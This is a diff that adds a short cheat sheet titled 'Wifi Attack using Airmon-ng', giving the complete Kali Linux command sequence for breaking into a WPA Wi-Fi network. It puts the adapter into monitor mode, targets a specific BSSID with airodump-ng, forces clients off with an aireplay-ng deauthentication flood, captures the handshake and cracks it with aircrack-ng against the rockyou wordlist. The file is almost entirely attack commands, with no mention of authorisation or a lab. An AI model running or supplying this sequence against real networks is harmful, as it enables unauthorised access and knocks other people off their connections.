@@ -1,0 +1,26 @@
+	Wifi Attack using Airmon-ng
+
+ifconfig  --- check wireless devices in system
+
+sudo su   --- for root terminal
+
+airmon-ng start/stop wlan0/wlan0mon   --- change wifi mode simple/monitor
+
+airodump-ng wlan0mon   --- all wifi connections near me
+
+airodump-ng wlan0mon -d 64:FB:92:76:22:12   --- check active users on connection
+
+airodump-ng -w hacked -c 4 --bssid 64:FB:92:76:22:12 wlan0mon   --- save packets and show handshake in first line CH after done next step deauth
+
+aireplay-ng --deauth 0 -a 64:FB:92:76:22:12 wlan0mon   --- send packets to crack the connection
+
+cd /usr/share/wordlists
+ls   ---  show complete pre build dict passwords list
+sudo gzip -d rockyou.txt.gz   ---  unzip file
+
+kali㉿kali)-[~]
+└─$ wireshark hacked-01.cap   --- see saptured packages and handshakes
+eapol  --- search on search bar to see total handshakes
+
+┌──(kali㉿kali)-[~]
+└─$ aircrack-ng hacked-01.cap -w /usr/share/wordlists/rockyou.txt  --- check password and match from wordlists
